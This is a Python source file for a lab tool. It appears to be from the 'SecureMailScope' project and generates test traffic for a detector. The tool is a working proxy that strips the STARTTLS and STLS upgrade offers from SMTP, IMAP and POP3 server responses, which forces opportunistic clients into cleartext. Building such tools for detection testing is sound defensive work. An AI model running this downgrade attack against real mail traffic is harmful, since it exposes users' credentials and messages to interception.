"""STARTTLS-stripping proxy for the SecureMailScope LAB.

Sits between a client and the lab mail server and rewrites the server's upgrade
offer to a same-length token ("STARTTLS" -> "XXXXXXXX", "STLS" -> "XXXX"), which
is exactly what inline stripping devices do so no TCP sequence rewriting is
needed. A client configured for "STARTTLS if available" then continues in
cleartext, and the capture shows the attack SecureMailScope must detect.

Listens on 25/587 (SMTP), 143 (IMAP), 110 (POP3) and forwards to --upstream.
For the isolated Docker lab network only.
"""
from __future__ import annotations

import argparse
import asyncio
import re

REWRITES = [
    (re.compile(rb"(?m)^(250[ -])STARTTLS"), rb"\1XXXXXXXX"),             # SMTP EHLO
    (re.compile(rb"(?i)(\[?CAPABILITY[^\r\n]*?) STARTTLS"), rb"\1 XXXXXXXX"),  # IMAP greeting / CAPABILITY
    (re.compile(rb"(?m)^STLS\r$"), rb"XXXX\r"),                              # POP3 CAPA
]


def strip(chunk: bytes) -> bytes:
    for rx, repl in REWRITES:
        chunk = rx.sub(repl, chunk)
    return chunk


async def pipe(reader: asyncio.StreamReader, writer: asyncio.StreamWriter, rewrite: bool) -> None:
    try:
        while data := await reader.read(65536):
            writer.write(strip(data) if rewrite else data)
            await writer.drain()
    except ConnectionError:
        pass
    finally:
        writer.close()


def handler(upstream: str, port: int):
    async def handle(cr: asyncio.StreamReader, cw: asyncio.StreamWriter) -> None:
        try:
            sr, sw = await asyncio.open_connection(upstream, port)
        except OSError:
            cw.close()
            return
        await asyncio.gather(pipe(cr, sw, False), pipe(sr, cw, True))
    return handle


async def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--listen", default="127.0.0.1")
    ap.add_argument("--upstream", required=True)
    ap.add_argument("--ports", default="25,587,143,110")
    a = ap.parse_args()
    servers = [await asyncio.start_server(handler(a.upstream, int(p)), a.listen, int(p)) for p in a.ports.split(",")]
    print(f"stripping proxy on {a.listen}:{a.ports} -> {a.upstream}", flush=True)
    await asyncio.gather(*(s.serve_forever() for s in servers))


if __name__ == "__main__":
    asyncio.run(main())
